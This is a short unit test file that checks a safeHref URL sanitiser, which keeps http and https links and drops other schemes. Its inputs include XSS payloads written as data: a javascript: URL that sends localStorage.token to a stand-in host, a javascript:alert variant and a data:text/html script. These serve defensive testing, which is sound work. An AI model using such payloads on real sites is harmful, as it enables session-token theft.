import { describe, expect, it } from 'vitest'

import { safeHref } from '@/lib/safeUrl'

describe('safeHref', () => {
  it('keeps http(s) links and drops everything else', () => {
    expect(safeHref('https://tracker.example/torrents/1')).toBe('https://tracker.example/torrents/1')
    expect(safeHref('http://radarr:7878/movie/1')).toBe('http://radarr:7878/movie/1')
    expect(safeHref("javascript:fetch('//x/'+localStorage.token)")).toBeUndefined()
    expect(safeHref(' JavaScript:alert(1)')).toBeUndefined()
    expect(safeHref('data:text/html,<script>alert(1)</script>')).toBeUndefined()
    expect(safeHref('not a url')).toBeUndefined()
    expect(safeHref(null)).toBeUndefined()
  })
})
